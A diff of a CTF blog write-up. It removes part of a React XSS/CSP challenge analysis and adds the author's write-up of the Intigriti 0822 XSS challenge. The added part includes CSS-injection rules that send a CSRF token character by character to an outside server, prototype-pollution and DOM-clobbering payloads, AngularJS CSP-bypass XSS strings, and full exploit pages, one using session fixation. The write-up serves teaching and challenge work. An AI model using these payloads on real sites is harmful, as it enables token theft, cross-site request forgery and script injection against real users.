@@ -1,257 +1,371 @@
-The flag is in a post owned by the admin, created when the server is on:
+Then, how to leak the content? Since `<input>` won't work, we can use `<meta>` tag!
 
-``` js
-(() => {
-    const flagId = crypto.randomBytes(6).toString("hex");
-    const flag = process.env.FLAG || "flag{test_flag}";
-    users.set("admin", {
-        pass: sha256(process.env.ADMIN_PASSWORD || "test_password"),
-        posts: Object.freeze([flagId]),
-    });
-    posts.set(flagId, {
-        id: flagId,
-        title: "Flag",
-        body: flag,
-    });
-})();
+`<meta>` is not displayed because browser adds a default `display:none` attribute, we can override it by explicitly declare `meta { display:block; }`. It's not enough, because `<meta>` is under `<head>`, and `<head>` is also hidden by default, so we need `head, meta { display:block; }` to make it visible.
+
+You may wondering: "It should be useless to make it 'visible', because meta content is invisible by default, you can't see the content on the screen!"
+
+It sounds fair, but surprisingly, the style for `<meta>` still apply even you can't see the content. 
+
+![](/img/intigriti-0822-xss-author-writeup/p4.png)
+
+By the way, there is a selector called [:has](https://developer.mozilla.org/en-US/docs/Web/CSS/:has), this will make this challenge much easier. But it's enabled by default from Chrome 105 which is still in beta until the end of August(yep, two days after). 
+
+If we can inject `<style>` tag, we can steal the first character of the CSRF token in the following way:
+
+```html
+<style>
+  head, meta[name=csrf-token] {
+    display: block;
+  }
+  
+  meta[name=csrf-token][content^="a"] { 
+    background: url(https://example.com?char=a);
+  }
+  
+  meta[name=csrf-token][content^="b"] { 
+    background: url(https://example.com?char=b);
+  }
+</style>
 ```
 
-There is no permission check for viewing a post, it means that if we know `flagId`, we can see the content and get the flag.
+We can steal all 32 characters by doing the same thing again and again. The implementation is a bit trivial, you can build your own or try to utilize some open-source projects on GitHub.
 
-The front-end codebase is small, and only one obvious vulnerability when rendering a post:
-
-``` js
-{/* CSP is on, so this should be fine, right? */}
-{/* Clueless */}
-<div dangerouslySetInnerHTML={{ __html: body }}></div>
-```
-
-The project is built with React, a popular library made by Meta(Facebook). Everything you render in React will be escaped automatically(it's great for developers) unless you use a very long attribute name: `dangerouslySetInnerHTML`. As the name implies, you can set `innerHTML` via this attribute.
-
-React team chose this name on purpose, because they want you to know that this attribute is dangerous and prone to XSS.
-
-So, now we have an XSS, just do `<svg onload>` and leak the flag?
-
-Not yet, don't forget the CSP.
-
-## CSP Bypass
-
-Here is the CSP for this challenge:
-
-``` js
-app.use((req, res, next) => {
-    res.setHeader(
-        "Content-Security-Policy",
-        "script-src 'self'; object-src 'none'; base-uri 'none';"
-    );
-    if (req.session.user && users.has(req.session.user)) {
-        req.user = users.get(req.session.user);
-    }
-    next();
-});
-```
-
-You can't inject your script because of the CSP, and this CSP is quite strict. When it comes to the client-side challenge, CSP is usually a good hint. I can think of a few techniques that it's allowed from this CSP:
-
-1. CSS injection (`<style>` and image are allowed)
-2. DOM clobbering (input is not sanitized)
-3. `<meta>` tag
-4. Inject the script in same origin (`self` is allowed)
-5. `<iframe>` is allowed
-
-## First thoughts - CSS injection
-
-My first idea is about CSS injection.
-
-If we can inject the style into the `/home` page which renders all the posts, we can steal the `href` which is `flagId` by doing this:
-
-``` css
-a[href^="/post/0"] {
-  background: url(//myserver?c=0);
-}
-
-a[href^="/post/1"] {
-  background: url(//myserver?c=1);
-}
-
-// ...
-```
-
-But, is it possible?
-
-When the admin bot visits our URL, it's `/post/random_id`, we can inject the style on this page for sure, but when we change the location to `/home`, the injected style is cleared. It seems not work.
-
-How about iframe?
-
-I know the style won't affect the content in an iframe if it's cross-origin, how about same-origin? Can we affect the style of an same-origin iframe? Although I think it's not possible, I still spent some times to explore this option. But, this way also not work in the end.
-
-## Other approaches
-
-DOM clobbering seems useless here, becasue I have never seen any DOM clobbering gadgets for React. Also, this React app uses no global variable.
-
-How about `meta` tag?
-
-I have seen some challenges abusing `<meta>` tag to do redirection and use `Referer` header to leak the URL, is it useful here? Probably not. Because it's meaningless to leak the URL here unless the admin bot clicks the post. I also checked the spec for `meta` tag to find is there are any unknown attributes, and found nothing in the end.
-
-How about XSLeaks? Can we leak the `href`?
-
-I tried to recall all the XSLeaks challenges I have seen, and I thought XSLeaks is also not helpful for this challenge. The reason is simple, how can we leak the `href` attribute? If the `flagId` is shown on the page, maybe we can try to leak it, but `flagId` is not even shown on the page, not possible to leak it.
-
-After thinking of so many ways but finding nothing useful, I decided to move my focus back to the `script` element.
-
-## self script
-
-I thought that maybe there is an API in back-end which outputs arbitrary content so that I can use that API as a source of script, like JSONP. It's allowed because it's same-origin. For example, `<script src="/apis/example?content=alert(1)">`
-
-By the way, loads a script via `innerHTML` is useless because the script won't get executed according to the [spec](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations).
-
-So we need to use `<iframe srcdoc>`, like this: `<iframe srcdoc="<script src='...'>"></iframe>`
-
-Here are all the APIs in the back-end:
+When displaying a message, it calls `DOMPurify.sanitize` to filter out malicious content, but `<style>` is not consider harmful and it's allowed by default in DOMPurify.
 
 ```js
-app.post("/api/login", (req, res) => {
-    let { user, pass } = req.body;
-    if (
-        !user ||
-        !pass ||
-        typeof user !== "string" ||
-        typeof pass !== "string"
-    ) {
-        return res.json({
-            success: false,
-            error: "Missing username or password",
-        });
-    }
+function showMessage(message, options) {
+  const getTimeout = options.timeout || (() => 1000)
+  const container = options.container || document.querySelector('body')
 
-    if (!users.has(user)) {
-        return res.json({
-            success: false,
-            error: "No user exists with that username",
-        });
-    }
+  const modal = document.createElement('div')
+  modal.id = 'messageModal'
+  modal.innerHTML = DOMPurify.sanitize(message)
+  container.appendChild(modal)
+  history.replaceState(null, null, ' ')
 
-    if (users.get(user).pass !== sha256(pass)) {
-        return res.json({ success: false, error: "Invalid password" });
-    }
-
-    req.session.user = user;
-    res.json({ success: true });
-});
-
-app.post("/api/register", (req, res) => {
-    let { user, pass } = req.body;
-    if (
-        !user ||
-        !pass ||
-        typeof user !== "string" ||
-        typeof pass !== "string"
-    ) {
-        return res.json({
-            success: false,
-            error: "Missing username or password",
-        });
-    }
-
-    if (user.length < 5 || pass.length < 7) {
-        return res.json({
-            success: false,
-            error: "Please choose a longer username or password",
-        });
-    }
-
-    if (users.has(user)) {
-        return res.json({
-            success: false,
-            error: "A user exists with that username",
-        });
-    }
-
-    req.session.user = user;
-    users.set(user, {
-        pass: sha256(pass),
-        posts: [],
-    });
-
-    res.json({ success: true });
-});
-
-const requiresLogin = (req, res, next) =>
-    req.user
-        ? next()
-        : res.json({ success: false, error: "You must be logged in!" });
-
-app.post("/api/create", requiresLogin, (req, res) => {
-    if (req.session.user === "admin") {
-        return res.json({ success: false, error: "uhhhhh... no" });
-    }
-
-    let { title, body } = req.body;
-    if (
-        !title ||
-        !body ||
-        typeof title !== "string" ||
-        typeof body !== "string"
-    ) {
-        return res.json({ success: false, error: "Missing title or body" });
-    }
-
-    let id = crypto.randomBytes(6).toString("hex");
-
-    posts.set(id, { id, title, body });
-    req.user.posts.push(id);
-
-    res.json({ success: true });
-});
-
-app.post("/api/posts", requiresLogin, (req, res) => {
-    return res.json({
-        success: true,
-        data: req.user.posts.map((id) => posts.get(id)),
-    });
-});
-
-app.get("/api/post/:id", requiresLogin, (req, res) => {
-    let { id } = req.params;
-    if (!id) {
-        return res.json({ success: false, error: "No id provided" });
-    }
-    if (!posts.has(id)) {
-        return res.json({
-            success: false,
-            error: "No post was found with that id",
-        });
-    }
-    return res.json({ success: true, data: posts.get(id) });
-});
-
-app.get("*", (req, res) => res.sendFile("index.html", { root: "public" }));
+  setTimeout(() => {
+    container.removeChild(modal)
+  }, getTimeout())
+}
 ```
 
-There are only two endpoints for `GET`:
+The problem is, our injected element will be removed after so called `timeout`, the default timeout is `Math.random()*300 + 300` as per following code:
 
-``` js
-app.get("/api/post/:id", requiresLogin, (req, res) => {
-    let { id } = req.params;
-    if (!id) {
-        return res.json({ success: false, error: "No id provided" });
-    }
-    if (!posts.has(id)) {
-        return res.json({
-            success: false,
-            error: "No post was found with that id",
-        });
-    }
-    return res.json({ success: true, data: posts.get(id) });
-});
-
-app.get("*", (req, res) => res.sendFile("index.html", { root: "public" }));
+```js
+function start() {
+  const message = decodeURIComponent(location.hash.replace('#msg=', ''))
+  if (!message.length) return
+  const options = {}
+  if (document.domain.match(/testing/)) {
+    options['production'] = false
+  } else {
+    options['production'] = true
+    options['timeout'] = () => Math.random()*300 + 300
+  }
+  showMessage(message, {
+    container: document.querySelector('body'),
+    ...options
+  })
+}
 ```
 
-The first one is rendered with `res.json`, so its content type is `application/json`, impossible to make it a valid script. The second one is for rendering static files, which are also useless.
+We can't steal a 32-characters CSRF token in 600ms, unless we find a way to increase the timeout.
 
-How about other script types?
+Look at the following part carefully:
 
-## Other script types
+```js
+if (document.domain.match(/testing/)) {
+  options['production'] = false
+} else {
+  options['production'] = true
+  options['timeout'] = () => Math.random()*300 + 300
+}
+```
 
-I wrote a post about different script types: [How much do you know about script type? ](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/).
+If the condition(`document.domain.match(/testing/)`) is `false`, the `timeout` will be set and can't be change. If we can let the condition be `true` and find a prototype pollution, we can pollute `Object.prototype.timeout` to manipulate the timeout.
+
+### Prototype pollution
+
+Regarding prototype pollution, people usually think it only appear when parsing query string or merge the object. In fact, the problem is about the pattern `obj[x][y]`, anywhere with such pattern can be vulnerable if you can control both `x` and `y`
+
+It's exactly the case for `initTheme`:
+
+```js
+function initTheme() {
+  if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+    isDarkMode = true
+  }
+
+  fetch("theme.php")
+    .then((res) => res.json())
+    .then((serverTheme) => {
+      theme = {
+        primary: {},
+        secondary: {}
+      }
+
+      // look carefully at the following for loop
+      for(let themeName in serverTheme) {
+        const currentTheme = theme[themeName]
+        const currentServerTheme = serverTheme[themeName]
+
+        for(let item in currentServerTheme) {
+          currentTheme[item] = () => isDarkMode ? currentServerTheme[item].dark : currentServerTheme[item].light
+        }
+      }
+
+      const themeDiv = document.querySelector('.theme-text')
+      themeDiv.innerText = `Primary - Text: ${theme?.primary?.text()}, Background: ${theme?.primary?.bg()}
+        Secondary - Text: ${theme?.secondary?.text()}, Background: ${theme?.secondary?.bg()}
+      `
+      start()
+    })
+}
+```
+
+In the loop, it assign `theme[themeName]` to `currentTheme`.
+
+Then in another inner loop, a function is assigned to `currentTheme[item]`, which is actually `theme[themeName][item]`.
+
+We can pollute the prototype by providing a theme like this:
+
+```js
+{
+  "__proto__":{
+    "timeout":{
+      "dark":"99999","light":"99999"
+    }
+  }
+}
+```
+
+After theme is loaded, `Object.prototype.timeout` became a function which always returns `"99999"`.
+
+We have made good progress by controlling the `timeout`, but how about the condition?
+
+How can we make `document.domain.match(/testing/)` true? Is that even possible?
+
+### DOM clobbering to the rescue
+
+The value of `document.domain` is what you thought, until DOM clobbering comes into play.
+
+Besides clobbering `window` properties, `document` properties can also be clobbered via `<img>`, `<form>`, `<object>` and `<embed>`
+
+For example, if we have `<img name=cookie>`, the value of `document.cookie` will be the img element instead of a string.
+
+Remember that we have a HTML injection in 20 characters?
+
+```php
+<input id="nameField" type="text" name="name" value="<?= $_SESSION['name']; ?>" maxlength="20">
+```
+
+We can let `name` be `"><img name=cookie>`, it's 19 characters, just fits.
+
+After `document.domain` became a DOM element, `document.domain.match` will throw an error because there is no `match` method in DOM or in it's prototype chain.
+
+Wait, did I say prototype chain?
+
+In JavaScript, when a given method is not found, the JS engine will keep looking one level up to check it's prototype until the prototype is `null`, hence the name "prototype chain".
+
+DOM element is also a kind of `object`, if `Object.prototype.match` is there, it will be used.
+
+Luckily, we can make it happen by leveraging the prototype pollution vulnerability:
+
+```js
+{
+  "__proto__":{
+    "timeout":{
+      "dark":"99999","light":"99999"
+    },
+    "match":{
+      "dark":"1", "light":"1"
+    }
+  }
+}
+```
+
+Now, `document.domain.match(/testing/)` returns `"1"` which is truthy and `timeout` is `9999`, we can finally exploit CSS injection and steal the CSRF token.
+
+Part1 is about steal CSRF token to perform CSRF, part2 is about exploit nested parser vulnerability and find a CSP bypass to perform XSS.
+
+After finished both parts, we can build our full exploit script.
+
+## Full Exploit
+
+1. Login with the name `"><img name=domain>` to do DOM clobbering
+2. Update theme to do prototype pollution
+3. Get CSRF token via CSS injection
+4. CSRF to submit the payload which leverage nested parser XSS + CSP bypass via AngularJS
+5. Pop up the alert
+
+``` html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+</head>
+
+<body>
+  <button onclick="run()">click me to start</button>
+  <form id=themeForm method="POST" target="newWindow" enctype="text/plain">
+    <input name='{"__proto__":{"timeout":{"dark":"99999","light":"99999"},"match":{"drak":"1","light":"1"}},"primary":{"text":{"dark":"#fff","light":"#fff"},"bg":{"dark":"#fff","light":"#fff"}},"secondary":{"text":{"dark":"#fff","light":"#fff"},"bg":{"dark":"#fff","light":"#fff","padding":"' value='"}}}'>
+  </form>
+  <form id=previewForm method="POST" target="newWindow">
+    <input name="csrf-token" value="">
+    <input name="desc" value="">
+    <input name="name" value="XSS">
+  </form>
+  <script>
+    const baseUrl = 'https://challenge-0822.intigriti.io/challenge'
+    // you need to prepare a server to steal csrf token
+    const cssInjectionServerUrl = 'http://localhost:5100'
+    let win
+    function run() {
+      // Step1. login
+      // Step2. DOM clobbering `document.domain`
+      let payload = '"><img name=domain>'
+      win = window.open(baseUrl + '/login.php?name=' + encodeURIComponent(payload), 'newWindow')
+
+      waitForWindowLoaded()
+    }
+
+    function waitForWindowLoaded() {
+      try {
+        // if we can access win.origin, it means that the location haven't changed
+        win.origin
+        setTimeout(() => waitForWindowLoaded(win), 200)
+      } catch(err) {
+        // window loaded
+        // Step3. update theme to do prototype pollution
+        themeForm.action = baseUrl + '/theme.php'
+        themeForm.submit()
+        setTimeout(getCsrfToken, 1000)
+      }
+    }
+
+    function getCsrfToken() {
+      // Step4: Get CSRF token via CSS injection
+      const id = Math.random()
+      fetch(cssInjectionServerUrl + '/result?id='+id)
+        .then(res => res.text())
+        .then(res => {
+          doXSS(res)
+        })
+
+      const cssInjectionPayload = `Please wait for a few seconds
+        <style>
+          @import url('${cssInjectionServerUrl}/start?id=${id}&len=32')
+        </style>`
+      win.location = baseUrl + '/app.php#msg=' + encodeURIComponent(cssInjectionPayload)
+    }
+
+    function doXSS(csrfToken) {
+      // Step5: Nested Parser XSS + CSP bypass via AngularJS
+      let xssPayload = `https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"><\/script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.png
+`
+      document.querySelector('#previewForm input[name=desc]').setAttribute('value', xssPayload)
+      document.querySelector('#previewForm input[name=csrf-token]').setAttribute('value', csrfToken)
+      previewForm.action = baseUrl + '/preview.php'
+      previewForm.submit()
+    }
+  </script>
+
+</body>
+</html>
+```
+
+Here is a working PoC: https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html
+
+But the css injection server is a bit buggy, and I have no plan to maintain it, so I will shutdown the server in a week.
+
+## Bonus
+
+Besides stealing CSRF token, there is another tricky and a bit cheated way to do CSRF without stealing it.
+
+Since we have control over other sub domains, for example, `challenge-0422.intigriti.io`, we can use session fixation to fix session id and CSRF token.
+
+1. Get a session id and CSRF token from server, assumed it's `sid123` and `token123`
+2. Run `document.cookie="PHPSESSID=sid123;Domain=intigriti.io;Max-Age=10;Secure";` in subdomain
+3. Do CSRF with CSRF token: `token123`
+
+PoC:
+
+``` html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+</head>
+
+<body>
+  <button onclick="run()">click me to start</button>
+  <form id=previewForm method="POST" target="abc">
+    <input name="csrf-token" value="">
+    <input name="desc" value="">
+    <input name="name" value="XSS">
+  </form>
+  <script>
+    const baseUrl = 'https://challenge-0822.intigriti.io/challenge'
+    
+    // get a pair of seesion id and csrf token first
+    const sid = '8341g3mkhlpojfup4k6keu3uls'
+    const token = '2d414a262b5b02643a364a23a5f67dd7'
+
+    function run() {
+         window.open(`https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=1#%0adocument.cookie='PHPSESSID=${sid};Domain=intigriti.io;Max-Age=10;Secure;'`, 'abc')
+
+        setTimeout(() => {
+          doXSS(token)
+        }, 2000)
+    }
+   
+
+    function doXSS(csrfToken) {
+      let xssPayload = `https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"><\/script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.png
+`
+      document.querySelector('#previewForm input[name=desc]').setAttribute('value', xssPayload)
+      document.querySelector('#previewForm input[name=csrf-token]').setAttribute('value', csrfToken)
+      previewForm.action = baseUrl + '/preview.php'
+      previewForm.submit()
+    }
+  </script>
+
+</body>
+</html>
+```
+
+I came up with this solution after the challenge started, and it shows how a sub-domain XSS can be abused to affect other sub-domain.
+
+## Another bypass with AngularJS only
+
+[@kinugawamasato](https://twitter.com/kinugawamasato/status/1565146690470162432) found another very coll way for the CSP bypass without any other library, here is the payload:
+
+```
+https://www.youtube.com/embed/srcdoc=
+<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
+<iframe/ng-app/ng-csp/srcdoc="
+  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
+  </script>
+  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
+></iframe>.jpg
+```
+
+It uses nested AngularJS expression to bypass `on` keyword, and also use `$event.target.ownerDocument.defaultView` to access window, brilliant!
+
+## Credits
+
+Bruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge.
+
+Kudos to [@Psych0tr1a](https://twitter.com/Psych0tr1a) for his nested parser XSS research: [Fuzzing for XSS via nested parsers condition](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/)
+
+Kudos to [@Strellic_](https://twitter.com/Strellic_) for his idea of chaining DOM clobbering and prototype pollution and share the writeup: [UNI CTF 2021: A Complex Web Exploit Chain & a 0day to Bypass an Impossible CSP](https://www.hackthebox.com/blog/UNI-CTF-21-complex-web-exploit-chain-0day-bypass-impossible-CSP)
+
+Kudos to [@tehjh](https://twitter.com/tehjh) for his amazing [CSP bypass via Angular](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#191-bytes)
+
+We hope you like the challenge and learn a lot of new things, see you next time!
